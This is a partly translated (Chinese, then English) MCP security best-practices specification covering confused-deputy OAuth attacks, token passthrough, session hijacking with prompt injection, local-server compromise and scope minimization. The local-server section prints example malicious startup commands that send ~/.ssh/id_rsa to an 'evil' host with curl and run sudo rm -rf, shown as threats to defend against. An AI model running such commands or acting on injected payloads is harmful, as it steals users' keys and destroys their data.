---
title: 安全最佳实践
---

<div id="enable-section-numbers" />

## 概述

### 目的和范围

本文档为Model Context Protocol (MCP)提供安全考虑，补充[MCP授权](../basic/authorization.mdx)规范。本文档识别了特定于MCP实现的安全风险、攻击向量和最佳实践。

本文档的主要受众包括实施MCP授权流程的开发者、MCP服务器操作员和评估基于MCP的系统的安全专业人员。本文档应与MCP授权规范和[OAuth 2.0安全最佳实践](https://datatracker.ietf.org/doc/html/rfc9700)一起阅读。

## 攻击和缓解措施

本部分详细描述了对MCP实现的攻击，以及潜在的应对措施。

### 混淆代理问题

攻击者可以利用连接到第三方API的MCP代理服务器，创建"[混淆代理](https://en.wikipedia.org/wiki/Confused_deputy_problem)"漏洞。这种攻击允许恶意客户端通过利用静态客户端ID、动态客户端注册和同意cookie的组合来获得授权码而无需适当的用户同意。

#### 术语

**MCP代理服务器**
: 一个连接MCP客户端到第三方API的MCP服务器，提供MCP功能同时委托操作，并充当到第三方API服务器的单个OAuth客户端。

**第三方授权服务器**
: 保护第三方API的授权服务器。它可能缺乏动态客户端注册支持，要求MCP代理使用静态客户端ID进行所有请求。

**第三方API**
: 提供实际API功能的受保护资源服务器。访问此API需要第三方授权服务器发行的令牌。

**静态客户端ID**
: MCP代理服务器与第三方授权服务器通信时使用的固定OAuth 2.0客户端标识符。此客户端ID指的是MCP服务器充当第三方API的客户端。它对于所有MCP服务器到第三方API的交互都是相同的值，无论哪个MCP客户端发起请求。

#### 易受攻击的条件

当所有以下条件都存在时，这种攻击成为可能：

- MCP代理服务器使用**静态客户端ID**与第三方授权服务器
- MCP代理服务器允许MCP客户端**动态注册**（每个客户端获得自己的client_id）
- 第三方授权服务器在第一次授权后设置**同意cookie**
- MCP代理服务器在转发到第三方授权之前没有实施适当的每客户端同意

#### 架构和攻击流程

##### Normal OAuth proxy usage (preserves user consent)

```mermaid
sequenceDiagram
    participant UA as User-Agent (Browser)
    participant MC as MCP Client
    participant M as MCP Proxy Server
    participant TAS as Third-Party Authorization Server

    Note over UA,M: Initial Auth flow completed

    Note over UA,TAS: Step 1: Legitimate user consent for Third Party Server

    M->>UA: Redirect to third party authorization server
    UA->>TAS: Authorization request (client_id: mcp-proxy)
    TAS->>UA: Authorization consent screen
    Note over UA: Review consent screen
    UA->>TAS: Approve
    TAS->>UA: Set consent cookie for client ID: mcp-proxy
    TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com
    UA->>M: 3P Authorization code
    Note over M,TAS: Exchange 3P code for 3P token
    Note over M: Generate MCP authorization code
    M->>UA: Redirect to MCP Client with MCP authorization code

    Note over M,UA: Exchange code for token, etc.
```

##### Malicious OAuth proxy usage (skips user consent)

```mermaid
sequenceDiagram
    participant UA as User-Agent (Browser)
    participant M as MCP Proxy Server
    participant TAS as Third-Party Authorization Server
    participant A as Attacker


    Note over UA,A: Step 2: Attack (leveraging existing cookie, skipping consent)
    A->>M: Dynamically register malicious client, redirect_uri: attacker.com
    A->>UA: Sends malicious link
    UA->>TAS: Authorization request (client_id: mcp-proxy) + consent cookie
    rect rgba(255, 17, 0, 0.67)
    TAS->>TAS: Cookie present, consent skipped
    end

   TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com
   UA->>M: 3P Authorization code
   Note over M,TAS: Exchange 3P code for 3P token
   Note over M: Generate MCP authorization code
   M->>UA: Redirect to attacker.com with MCP Authorization code
   UA->>A: MCP Authorization code delivered to attacker.com
   Note over M,A: Attacker exchanges MCP code for MCP token
   A->>M: 攻击者冒充用户访问MCP服务器
```

#### 攻击描述

当MCP代理服务器使用静态客户端ID与第三方授权服务器进行身份验证时，以下攻击成为可能：

1. 用户正常通过MCP代理服务器进行身份验证以访问第三方API
2. 在此流程中，第三方授权服务器在用户代理上设置一个cookie，表示对静态客户端ID的同意
3. 攻击者后来向用户发送一个恶意链接，其中包含一个精心设计的授权请求，该请求包含恶意重定向URI以及新的动态注册客户端ID
4. 当用户点击链接时，他们的浏览器仍然有来自先前合法请求的同意cookie
5. 第三方授权服务器检测到cookie并跳过同意屏幕
6. MCP授权码被重定向到攻击者的服务器（在[动态客户端注册](/specification/draft/basic/authorization#dynamic-client-registration)期间在恶意`redirect_uri`参数中指定）
7. 攻击者将窃取的授权码兑换为MCP服务器的访问令牌而无需用户的明确批准
8. 攻击者现在可以作为受损用户访问第三方API

#### 缓解措施

为了防止混淆代理攻击，MCP代理服务器**必须**实施每客户端同意和适当的安全控制，如下所述。

##### 同意流程实施

以下图表显示了如何正确实施在第三方授权流程**之前**运行的每客户端同意：

```mermaid
sequenceDiagram
    participant Client as MCP Client
    participant Browser as User's Browser
    participant MCP as MCP Server
    participant ThirdParty as Third-Party AuthZ Server

    Note over Client,ThirdParty: 1. Client Registration (Dynamic)
    Client->>MCP: Register with redirect_uri
    MCP-->>Client: client_id

    Note over Client,ThirdParty: 2. Authorization Request
    Client->>Browser: Open MCP server authorization URL
    Browser->>MCP: GET /authorize?client_id=...&redirect_uri=...

    alt Check MCP Server Consent
        MCP->>MCP: Check consent for this client_id
        Note over MCP: Not previously approved
    end

    MCP->>Browser: Show MCP server-owned consent page
    Note over Browser: "Allow [Client Name] to access [Third-Party API]?"
    Browser->>MCP: POST /consent (approve)
    MCP->>MCP: Store consent decision for client_id

    Note over Client,ThirdParty: 3. Forward to Third-Party
    MCP->>Browser: Redirect to third-party /authorize
    Note over MCP: Use static client_id for third-party

    Browser->>ThirdParty: Authorization request (static client_id)
    ThirdParty->>Browser: User authenticates & consents
    ThirdParty->>Browser: Redirect with auth code

    Browser->>MCP: Callback with third-party code
    MCP->>ThirdParty: Exchange code for token (using static client_id)
    MCP->>Browser: Redirect to client's registered redirect_uri
```

##### 必需的保护措施

**每客户端同意存储**

MCP代理服务器**必须**：

- 维护每个用户的已批准`client_id`值注册表
- 在启动第三方授权流程**之前**检查此注册表
- 安全地存储同意决定（服务器端数据库，或服务器特定cookie）

**同意UI要求**

MCP级别的同意页面**必须**：

- 通过名称清楚地识别请求的MCP客户端
- 显示正在请求的特定第三方API范围
- 显示将发送令牌的注册`redirect_uri`
- 实施CSRF保护（例如，状态参数、CSRF令牌）
- 通过`frame-ancestors` CSP指令或`X-Frame-Options: DENY`防止iframe嵌入以防止点击劫持

**同意Cookie安全**

如果使用cookie跟踪同意决定，它们**必须**：

- 对cookie名称使用`__Host-`前缀
- 设置`Secure`、`HttpOnly`和`SameSite=Lax`属性
- 进行加密签名或使用服务器端会话
- 绑定到特定的`client_id`（不仅仅是"用户已同意"）

**重定向URI验证**

MCP代理服务器**必须**：

- 验证授权请求中的`redirect_uri`与注册的URI完全匹配
- 如果`redirect_uri`在没有重新注册的情况下发生变化，则拒绝请求
- 使用确切的字符串匹配（不是模式匹配或通配符）

**OAuth State Parameter Validation**

OAuth `state`参数对于防止授权码拦截和CSRF攻击至关重要。适当的状态验证确保在授权端点的同意批准在回调端点得到强制执行。

实施OAuth流程的MCP代理服务器**必须**：

- 为每个授权请求生成加密安全的随机`state`值
- 在同意被明确批准**之后**，仅在服务器端存储`state`值（在安全的会话存储或加密cookie中）
- 在重定向到第三方身份提供商**之前**立即设置`state`跟踪cookie/会话（不是在同意批准之前）
- 在回调端点验证`state`查询参数与回调请求cookie或请求的基于cookie的会话中存储的值完全匹配
- 拒绝任何缺少`state`参数或不匹配的回调请求
- 确保`state`值是一次性的（验证后删除）并具有短暂的过期时间（例如，10分钟）

包含`state`值的同意cookie或会话**不得**在用户在MCP服务器的授权端点批准同意屏幕**之后**设置。在同意批准之前设置此cookie会使同意屏幕无效，因为攻击者可以通过制作恶意授权请求来绕过它。

### 令牌传递

"令牌传递"是一种反模式，其中MCP服务器接受来自MCP客户端的令牌，而不验证令牌是否正确发行_给MCP服务器_，并将它们传递给下游API。

#### 风险

令牌传递在[授权规范](/specification/draft/basic/authorization)中被明确禁止，因为它引入了许多安全风险，包括：

- **安全控制规避**
  - MCP服务器或下游API可能实施重要的安全控制，如速率限制、请求验证或流量监控，这些控制依赖于令牌受众或其他凭据约束。如果客户端可以获得令牌并直接与下游API一起使用，而MCP服务器没有正确验证它们或确保令牌是为正确的服务发行的，它们就会绕过这些控制。
- **问责制和审计跟踪问题**
  - 当客户端使用上游发行的访问令牌（可能对MCP服务器不透明）调用时，MCP服务器将无法识别或区分MCP客户端。
  - 下游资源服务器的日志可能显示似乎来自不同来源的请求，具有不同的身份，而不是实际转发令牌的MCP服务器。
  - 这两个因素使事件调查、控制和审计更加困难。
  - 如果MCP服务器在不验证其声明（例如，角色、权限或受众）或其他元数据的情况下传递令牌，拥有被盗令牌的恶意行为者可以使用服务器作为数据泄露的代理。
- **信任边界问题**
  - 下游资源服务器授予对特定实体的信任。此信任可能包括关于来源或客户端行为模式的假设。打破此信任边界可能导致意外问题。
  - 如果令牌被多个服务接受而没有适当验证， compromising一个服务的攻击者可以使用令牌访问其他连接的服务。
- **未来兼容性风险**
  - 即使MCP服务器今天从"纯代理"开始，它可能稍后需要添加安全控制。从适当的令牌受众分离开始可以更容易地发展安全模型。

#### 缓解措施

MCP服务器**不得**接受任何不是明确为MCP服务器发行的令牌。

### 会话劫持

会话劫持是一种攻击向量，其中服务器向客户端提供会话ID，而未经授权的一方能够获得并使用相同的会话ID来冒充原始客户端并代表他们执行未经授权的操作。

#### 会话劫持提示注入

```mermaid
sequenceDiagram
    participant Client
    participant ServerA
    participant Queue
    participant ServerB
    participant Attacker

    Client->>ServerA: Initialize (connect to streamable HTTP server)
    ServerA-->>Client: Respond with session ID

    Attacker->>ServerB: Access/guess session ID
    Note right of Attacker: Attacker knows/guesses session ID

    Attacker->>ServerB: Trigger event (malicious payload, using session ID)
    ServerB->>Queue: Enqueue event (keyed by session ID)

    ServerA->>Queue: Poll for events (using session ID)
    Queue-->>ServerA: Event data (malicious payload)

    ServerA-->>Client: Async response (malicious payload)
    Client->>Client: Acts based on malicious payload
```

#### 会话劫持冒充

```mermaid
sequenceDiagram
    participant Client
    participant Server
    participant Attacker

    Client->>Server: Initialize (login/authenticate)
    Server-->>Client: Respond with session ID (persistent session created)

    Attacker->>Server: Access/guess session ID
    Note right of Attacker: Attacker knows/guesses session ID

    Attacker->>Server: Make API call (using session ID, no re-auth)
    Server-->>Attacker: Respond as if Attacker is Client (session hijack)
```

#### 攻击描述

当您有多个有状态的HTTP服务器处理MCP请求时，以下攻击向量成为可能：

**会话劫持提示注入**

1. 客户端连接到**服务器A**并接收会话ID。
2. 攻击者获得现有会话ID并使用该会话ID向**服务器B**发送恶意事件。
   - 当服务器支持[重新传递/可恢复流](/specification/draft/basic/transports#resumability-and-redelivery)时，在接收响应之前故意终止请求可能导致它通过服务器发送事件的GET请求被原始客户端恢复。
   - 如果特定服务器作为工具调用的后果启动服务器发送事件，例如`notifications/tools/list_changed`，其中可能影响服务器提供的工具，则客户端可能最终获得他们不知道已启用的工具。

3. **服务器B**将事件（与会话ID关联）排入共享队列。
4. **服务器A**使用会话ID轮询队列以获取事件并检索恶意负载。
1. **Server A** sends the malicious payload to the client as an asynchronous or resumed response.
1. The client receives and acts on the malicious payload, leading to potential compromise.

**Session Hijack Impersonation**

1. The MCP client authenticates with the MCP server, creating a persistent session ID.
2. The attacker obtains the session ID.
3. The attacker makes calls to the MCP server using the session ID.
4. MCP server does not check for additional authorization and treats the attacker as a legitimate user, allowing unauthorized access or actions.

#### Mitigation

To prevent session hijacking and event injection attacks, the following mitigations should be implemented:

MCP servers that implement authorization **MUST** verify all inbound requests.
MCP Servers **MUST NOT** use sessions for authentication.

MCP servers **MUST** use secure, non-deterministic session IDs.
Generated session IDs (e.g., UUIDs) **SHOULD** use secure random number generators. Avoid predictable or sequential session identifiers that could be guessed by an attacker. Rotating or expiring session IDs can also reduce the risk.

MCP servers **SHOULD** bind session IDs to user-specific information.
When storing or transmitting session-related data (e.g., in a queue), combine the session ID with information unique to the authorized user, such as their internal user ID. Use a key format like `<user_id>:<session_id>`. This ensures that even if an attacker guesses a session ID, they cannot impersonate another user as the user ID is derived from the user token and not provided by the client.

MCP servers can optionally leverage additional unique identifiers.

### Local MCP Server Compromise

Local MCP servers are MCP Servers running on a user's local machine, either by the user downloading and executing a server, authoring a server themselves, or installing through a client's configuration flows. These servers may have direct access to the user's system and may be accessible to other processes running on the user's machine, making them attractive targets for attacks.

#### Attack Description

Local MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements in place, the following attacks become possible:

1. An attacker includes a malicious "startup" command in a client configuration
2. An attacker distributes a malicious payload inside the server itself
3. An attacker accesses an insecure local server that's left running on localhost via DNS rebinding

Example malicious startup commands that could be embedded:

```bash
# Data exfiltration
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location

# Privilege escalation
sudo rm -rf /important/system/files && echo "MCP server installed!"
```

#### Risks

Local MCP servers with inadequate restrictions or from untrusted sources introduce several critical security risks:

- **Arbitrary code execution**. Attackers can execute any command with MCP client privileges.
- **No visibility**. Users have no insight into what commands are being executed.
- **Command obfuscation**. Malicious actors can use complex or convoluted commands to appear legitimate.
- **Data exfiltration**. Attackers can access legitimate local MCP servers via compromised javascript.
- **Data loss**. Attackers or bugs in legitimate servers could lead to irrecoverable data loss on the host machine.

#### Mitigation

If an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands.

**Pre-Configuration Consent**

Display a clear consent dialog before connecting a new local MCP server via one-click configuration. The MCP client **MUST**:

- Show the exact command that will be executed, without truncation (include arguments and parameters)
- Clearly identify it as a potentially dangerous operation that executes code on the user's system
- Require explicit user approval before proceeding
- Allow users to cancel the configuration

The MCP client **SHOULD** implement additional checks and guardrails to mitigate potential code execution attack vectors:

- Highlight potentially dangerous command patterns (e.g., commands containing `sudo`, `rm -rf`, network operations, file system access outside expected directories)
- Display warnings for commands that access sensitive locations (home directory, SSH keys, system directories)
- Warn that MCP servers run with the same privileges as the client
- Execute MCP server commands in a sandboxed environment with minimal default privileges
- Launch MCP servers with restricted access to the file system, network, and other system resources
- Provide mechanisms for users to explicitly grant additional privileges (e.g., specific directory access, network access) when needed
- Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)

MCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes:

- Use the `stdio` transport to limit access to just the MCP client
- Restrict access if using an HTTP transport, such as:
  - Require an authorization token
  - Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access

### Scope Minimization

Poor scope design increases token compromise impact, elevates user friction, and obscures audit trails.

#### Attack Description

An attacker obtains (via log leakage, memory scraping, or local interception) an access token carrying broad scopes (`files:*`, `db:*`, `admin:*`) that were granted up front because the MCP server exposed every scope in `scopes_supported` and the client requested them all. The token enables lateral data access, privilege chaining, and difficult revocation without re-consenting the entire surface.

#### Risks

- Expanded blast radius: stolen broad token enables unrelated tool/resource access
- Higher friction on revocation: revoking a max-privilege token disrupts all workflows
- Audit noise: single omnibus scope masks user intent per operation
- Privilege chaining: attacker can immediately invoke high-risk tools without further elevation prompts
- Consent abandonment: users decline dialogs listing excessive scopes
- Scope inflation blindness: lack of metrics makes over-broad requests normalised

#### Mitigation

Implement a progressive, least-privilege scope model:

- Minimal initial scope set (e.g., `mcp:tools-basic`) containing only low-risk discovery/read operations
- Incremental elevation via targeted `WWW-Authenticate` `scope="..."` challenges when privileged operations are first attempted
- Down-scoping tolerance: server should accept reduced scope tokens; auth server MAY issue a subset of requested scopes

Server guidance:

- Emit precise scope challenges; avoid returning the full catalog
- Log elevation events (scope requested, granted subset) with correlation IDs

Client guidance:

- Begin with only baseline scopes (or those specified by initial `WWW-Authenticate`)
- Cache recent failures to avoid repeated elevation loops for denied scopes

#### Common Mistakes

- Publishing all possible scopes in `scopes_supported`
- Using wildcard or omnibus scopes (`*`, `all`, `full-access`)
- Bundling unrelated privileges to preempt future prompts
- Returning entire scope catalog in every challenge
- Silent scope semantic changes without versioning
- Treating claimed scopes in token as sufficient without server-side authorization logic

Proper minimization constrains compromise impact, improves audit clarity, and reduces consent churn.
